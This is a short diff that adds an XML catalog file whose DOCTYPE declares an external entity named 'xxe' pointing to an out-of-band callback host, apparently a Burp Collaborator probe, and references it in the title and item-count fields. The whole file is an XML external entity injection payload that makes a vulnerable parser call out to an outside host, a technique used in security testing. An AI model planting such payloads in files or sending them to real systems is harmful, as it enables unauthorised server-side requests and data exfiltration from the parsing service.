@@ -1,0 +1,6 @@
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://fromgithub.knb6764j83u0n57eyladbgfwqnwem2cq1.burp.sentinelvm.com/randomPath"> ]><umcCatalog version="3.0" teamId="infocheck_team_id" catalogId="1111">
+    <totalItemCount>&xxe;</totalItemCount>
+    <lastBuildDate>2024-04-08T16:40:43.740Z</lastBuildDate>
+    <title>&xxe;</title>
+    <defaultLocale>en-US</defaultLocale>
+</umcCatalog>
